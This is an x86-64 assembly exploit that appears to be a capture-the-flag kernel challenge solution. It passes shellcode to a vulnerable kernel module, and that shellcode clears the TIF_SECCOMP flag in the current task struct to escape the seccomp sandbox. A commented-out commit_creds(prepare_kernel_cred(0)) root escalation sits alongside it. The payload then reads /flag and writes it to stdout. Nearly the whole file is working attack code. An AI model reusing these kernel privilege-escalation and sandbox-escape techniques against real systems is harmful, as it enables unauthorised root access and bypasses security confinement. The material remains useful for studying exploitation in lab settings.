; nasm level8.0.asm 
BITS 64

call _start

_kernel_sc:
; privilege escalation: commit_creds(prepare_kernel_cred(0))
;xor    rdi, rdi
;mov    rbx, 0xffffffff81089660
;call   rbx
;mov    rdi, rax
;mov    rbx, 0xffffffff81089310
;call   rbx
; turning off seccomp by disabling TIF_SECCOMP
; gs+0x15d00 points to current_task_struct
; current_task_struct is a pointer to the task_struct
; esencially we are doing current_task_struct->thread_info.flag &= (1 << TIF_SECCOMP)
mov rax, [gs:0x15d00]
and qword [rax], 0xfffffffffffffeff
xor rax, rax
ret

_start:
  ; write(module_fd, sc, sc_len)
  ; this invokes the `device_write` function of the kernel module
  ; we NEED to disable seccomp before calling open, sendfile, exit
  xor rdi, rdi
  xor rsi, rsi
  xor rdx, rdx
  xor rax, rax
  mov rdi, 3
  pop rsi
  mov rdx, 49
  mov al, 1
  syscall
  ; open("/flag", O_RDONLY, 0)
  mov rbx, 0x00000067616c662f
  push rbx
  push rsp
  pop rdi
  xor rsi, rsi
  xor rdx, rdx
  mov rax, 2
  syscall
  ; sendfile(stdout, flag_fd, offset, count)
  mov rdi, 1
  mov rsi, rax
  xor rdx, rdx
  mov r10, 0x100
  mov rax, 0x28
  syscall
  ; exit(0)
  mov rax, 60
  xor rdi, rdi
  syscall
